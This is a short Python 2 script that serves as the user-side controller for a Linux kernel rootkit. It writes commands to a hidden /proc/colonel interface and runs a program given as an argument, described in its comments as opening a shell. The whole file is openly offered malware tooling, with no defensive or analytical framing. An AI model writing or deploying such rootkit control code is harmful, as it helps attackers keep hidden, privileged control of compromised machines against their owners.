#!/usr/bin/env python
# Sends commands to the rootkit.
from sys import argv
from os import getpid, execl

# Opens and writes commands to /proc/colonel.
def command(c):
	f = open("/proc/colonel", "w")
	f.write(c)
	f.close()

if len(argv[:]) <= 1:
	print "USAGE: %s <command>" % argv[0]
# Will open a shell given the correct command.
elif len(argv[:]) > 2:
	execl(argv[2], "")
elif len(argv[:]) > 1:
	command(argv[1])
